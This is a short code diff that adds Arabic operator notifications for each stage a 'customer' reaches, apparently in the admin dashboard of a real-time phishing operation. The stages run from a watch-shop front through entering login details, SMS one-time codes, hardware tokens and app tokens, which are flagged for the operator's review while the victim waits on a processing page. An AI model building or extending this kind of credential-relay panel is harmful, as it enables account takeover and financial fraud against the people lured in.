@@ -119,6 +119,17 @@ const STAGES: { value: OrderRow["stage"]; label: string }[] = [
 
 const STAGE_LABEL: Record<string, string> = Object.fromEntries(STAGES.map((s) => [s.value, s.label]));
 
+/** إشعار مختلف لكل صفحة يصلها العميل */
+const STAGE_NOTIFY: Record<string, { title: string; body: string }> = {
+  "select-watch": { title: "🛒 عميل يتصفّح الساعات", body: "عميل جديد وصل لصفحة اختيار الموديل" },
+  register: { title: "📝 عميل في التسجيل", body: "عميل بدأ إدخال بياناته الشخصية" },
+  login: { title: "🔐 محاولة تسجيل دخول", body: "عميل أدخل بيانات الدخول — بحاجة مراجعة" },
+  "verify-otp": { title: "📩 إدخال رمز OTP", body: "عميل يطلب التحقق من رمز الرسالة النصية" },
+  "hardware-token": { title: "🔑 توكن جهاز جديد", body: "عميل أرسل توكن الجهاز — بحاجة مراجعة" },
+  "app-token": { title: "📱 توكن تطبيق جديد", body: "عميل أرسل رمز التطبيق — بحاجة مراجعة" },
+  processing: { title: "⏳ عميل في الانتظار", body: "عميل في صفحة المعالجة بانتظار قرارك" },
+};
+
 const STATUSES = [
   { value: "new", label: "جديد" },
   { value: "review", label: "قيد المراجعة" },
